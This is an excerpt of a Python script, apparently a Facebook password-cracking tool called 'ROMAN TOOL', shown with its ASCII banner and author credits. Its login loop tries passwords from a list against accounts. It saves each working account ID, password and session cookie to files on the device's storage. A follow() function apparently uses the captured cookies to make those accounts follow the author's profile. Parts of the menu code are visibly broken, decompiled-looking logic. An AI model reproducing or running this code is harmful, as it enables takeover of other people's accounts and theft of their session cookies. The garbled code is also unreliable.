...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/Hi.Baby.Its.Me.roman.king.20b')
        return None
    if None == '3':
        os.system('xdg-open https://youtube.com/channel/UC7r-laLOfnP70Lp2UP32QfQ')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/groups/2034350986783691')
        return None
    if None == '0':
        os.system('exit')
        return None
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/Hi.Baby.Its.Me.roman.king.20b', {
...
\033[1;35m       888   Y88b
\033[1;35m       888    888
\033[1;32m       888   d88P .d88b.  88888b.d88b.   8888b.  88888b.  
\033[1;32m       8888888P" d88""88b 888 "888 "88b     "88b 888 "88b
\033[1;35m       888 T88b  888  888 888  888  888 .d888888 888  888 
\033[1;35m       888  T88b Y88..88P 888  888  888 888  888 888  888 
\033[1;32m       888   T88b "Y88P"  888  888  888 "Y888888 888  888
 
\033[1;37m================= \33[32;45mROMAN\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mROMAN\33[0;m\033[1;32m && \033[1;33mROMAN\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m MD Babul Islam
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mpicciromankong
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mNana Nati king
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mROMAN\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO ROMAN TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(ROMAN-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ROMAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(ROMAN-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ROMAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[ROMAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
